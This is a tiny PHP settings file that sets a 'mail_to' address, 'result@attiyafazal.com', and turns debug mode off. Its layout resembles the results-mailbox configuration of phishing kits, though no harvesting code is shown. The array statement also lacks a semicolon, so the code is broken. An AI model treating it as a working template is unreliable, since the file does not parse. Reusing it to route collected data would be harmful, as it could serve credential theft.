<?php
$setting = [
  "mail_to" => "result@attiyafazal.com",
  "debug_mode" => false
]

?>
